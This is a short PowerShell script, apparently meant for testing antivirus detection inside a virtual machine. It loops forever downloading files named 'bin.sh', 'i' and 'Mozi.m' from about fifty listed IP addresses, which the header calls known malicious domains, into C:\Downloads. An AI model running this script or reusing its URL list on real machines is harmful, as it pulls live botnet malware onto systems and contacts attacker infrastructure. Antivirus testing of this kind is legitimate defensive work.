# DO NOT RUN THIS FILE ON YOUR HOST MACHINE, DO IT ON A VIRTUAL MACHINE (VM) IF YOU'RE GOING TO RUN THE CODE AT ALL. THIS SCRIPT PINGS KNOWN MALICIOUS
# DOMAINS, WHICH MAY STEAL INFORMATION. TO ENSURE SAFE USE OF THIS PROGRAM INSIDE A VIRTUAL MACHINE, PLEASE RUN THE PROGRAM AND DO NOT ADD EXCLUSIONS IN
# THE ANTIVIRUS YOU ARE TRYING TO TEST AS IT WILL DECREASE THE TEST'S USEFULNESS. THIS PROGRAM IS UNDER EXPERIMENTATION AND MAY NOT WORK AS INTENDED IF
# AT ALL. PLEASE KEEP THIS IN MIND WHEN EXECUTING THIS PROGRAM IN YOUR VIRTUAL MACHINE.

while ($true) {

$urls = @(
    "http://222.137.83.24:39926/bin.sh",
    "http://117.252.168.65:36030/i",
    "http://115.63.183.62:58957/bin.sh",
    "http://115.50.30.228:33238/bin.sh",
    "http://117.255.187.113:34482/bin.sh",
    "http://117.194.169.233:55807/bin.sh",
    "http://117.211.44.120:39163/i",
    "http://42.224.85.153:49075/i",
    "http://84.121.112.59:41300/.i",
    "http://83.209.205.203:47438/i",
    "http://219.157.64.26:51588/bin.sh",
    "http://124.131.107.45:41206/bin.sh",
    "http://119.189.229.170:46945/bin.sh",
    "http://42.225.49.4:59977/i",
    "http://112.248.117.174:42546/i",
    "http://46.32.172.198:10955/mozi.a",
    "http://42.224.85.153:49075/bin.sh",
    "http://182.126.85.152:55278/i",
    "http://182.116.119.63:40991/bin.sh",
    "http://117.252.168.65:36030/bin.sh",
    "http://115.49.200.84:48478/i",
    "http://113.194.129.107:35910/i",
    "http://117.219.125.10:56020/bin.sh",
    "http://175.107.13.12:55058/Mozi.m",
    "http://27.206.197.66:58445/Mozi.m",
    "http://115.48.150.37:55699/Mozi.m",
    "http://190.182.251.198:41251/Mozi.m",
    "http://116.68.97.168:37778/Mozi.m",
    "http://59.88.224.200:53089/Mozi.m",
    "http://112.239.98.168:42835/Mozi.m",
    "http://42.225.49.4:59977/bin.sh",
    "http://164.163.25.180:39963/Mozi.m",
    "http://222.142.255.34:55854/Mozi.m",
    "http://190.182.251.172:59569/Mozi.m",
    "http://102.33.143.130:58963/Mozi.m",
    "http://113.110.77.113:59652/Mozi.m",
    "http://59.89.234.92:36638/Mozi.m",
    "http://115.75.59.189:51209/Mozi.m",
    "http://27.215.214.244:37465/bin.sh",
    "http://222.138.79.96:37411/bin.sh",
    "http://222.137.83.24:39926/i",
    "http://42.229.223.251:42716/bin.sh",
    "http://213.200.146.138:59867/mozi.a",
    "http://112.248.28.75:51267/i",
    "http://115.48.50.151:48977/i",
    "http://221.14.106.144:38505/i",
    "http://113.194.129.107:35910/bin.sh",
    "http://59.182.145.83:52927/i",
    "http://222.137.83.24:39926/bin.sh",
    "http://42.224.28.168:43190/bin.sh"

    
)

$outputFolder = "C:\Downloads"

foreach ($url in $urls) {
    $fileName = [System.IO.Path]::GetFileName($url)
    $outputPath = Join-Path -Path $outputFolder -ChildPath $fileName

    Write-Host "Downloading file from $url..."
    
    try {
        Invoke-WebRequest -Uri $url -OutFile $outputPath
        Write-Host "File downloaded successfully: $outputPath"
    } catch {
        Write-Host "Failed to download file: $url"
    }
}

# Arth-End loop
}
